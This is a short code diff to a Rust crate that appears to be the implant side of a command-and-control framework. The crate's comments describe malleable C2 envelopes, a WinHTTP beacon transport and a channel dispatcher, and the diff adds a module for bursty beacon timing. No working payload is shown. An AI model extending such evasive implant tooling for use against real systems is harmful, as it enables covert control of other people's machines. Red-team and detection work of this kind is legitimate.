@@ -15,6 +15,8 @@
 //! - [`envelopes`] — build-time-baked malleable C2 envelope shapes (this
 //!   crate's build.rs resolves `NYX_PROFILE` host-side and bakes the
 //!   http-post client/server Step/Terminator lists).
+//! - [`timing`] — baked `timing_baseline` + bursty cadence helper (host-
+//!   compilable; not Windows-gated).
 //! - [`transport`] — WinHTTP POST for the beacon frame (TLS via
 //!   WINHTTP_FLAG_SECURE).
 //! - [`channels`] — channel-agnostic multi-transport dispatcher
@@ -26,6 +28,8 @@ extern crate alloc;
 
 #[cfg(all(test, target_os = "windows"))]
 pub(crate) mod testutil;
+
+pub mod timing;
 
 #[cfg(target_os = "windows")]
 pub mod channels;
